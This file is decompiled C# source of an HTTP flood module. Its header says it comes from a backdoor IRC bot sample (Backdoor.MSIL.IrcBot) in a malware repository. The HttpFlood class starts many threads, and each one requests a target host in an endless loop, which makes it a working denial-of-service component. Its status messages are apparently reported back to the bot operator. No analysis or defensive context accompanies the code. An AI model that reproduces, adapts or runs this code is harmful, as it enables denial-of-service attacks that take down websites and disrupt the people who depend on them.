// Decompiled with JetBrains decompiler
// Type: Realtek.HttpFlood
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.Net;
using System.Threading;

namespace Realtek
{
  internal class HttpFlood
  {
    private static ThreadStart[] FloodingJob;
    private static Thread[] FloodingThread;
    public static string Host;
    public static int Interval = 20;
    public static bool IsEnabled;
    private static HttpFlood.HttpRequest[] RequestClass;
    public static int Threads = 10;

    public static void StartHttpFlood()
    {
      HttpFlood.FloodingThread = new Thread[HttpFlood.Threads];
      HttpFlood.FloodingJob = new ThreadStart[HttpFlood.Threads];
      HttpFlood.RequestClass = new HttpFlood.HttpRequest[HttpFlood.Threads];
      for (int index = 0; index < HttpFlood.Threads; ++index)
      {
        HttpFlood.RequestClass[index] = new HttpFlood.HttpRequest(HttpFlood.Host, HttpFlood.Interval);
        HttpFlood.FloodingJob[index] = new ThreadStart(HttpFlood.RequestClass[index].Send);
        HttpFlood.FloodingThread[index] = new Thread(HttpFlood.FloodingJob[index]);
        HttpFlood.FloodingThread[index].Start();
      }
      HttpFlood.IsEnabled = true;
      Program.Writer.WriteLine(Program.MessageGreen + "httpflood started on " + HttpFlood.Host);
    }

    public static void StopHttpFlood()
    {
      for (int index = 0; index < HttpFlood.Threads; ++index)
      {
        try
        {
          HttpFlood.FloodingThread[index].Abort();
          HttpFlood.FloodingThread[index] = (Thread) null;
          HttpFlood.FloodingJob[index] = (ThreadStart) null;
          HttpFlood.RequestClass[index] = (HttpFlood.HttpRequest) null;
        }
        catch (Exception ex)
        {
          Program.Writer.WriteLine(Program.MessageRed + (object) ex);
          Program.Writer.Flush();
          Thread.Sleep(5000);
        }
      }
      HttpFlood.IsEnabled = false;
      Program.Writer.WriteLine(Program.MessageGreen + "HTTP flood stopped");
    }

    private class HttpRequest
    {
      private string Host;
      private WebClient Http = new WebClient();
      private int Interval;

      public HttpRequest(string Host, int Interval)
      {
        this.Host = Host;
        this.Interval = Interval;
      }

      public void Send()
      {
        while (true)
        {
          try
          {
            this.Http.DownloadString(this.Host);
            Thread.Sleep(this.Interval);
          }
          catch
          {
            Thread.Sleep(this.Interval);
          }
        }
      }
    }
  }
}
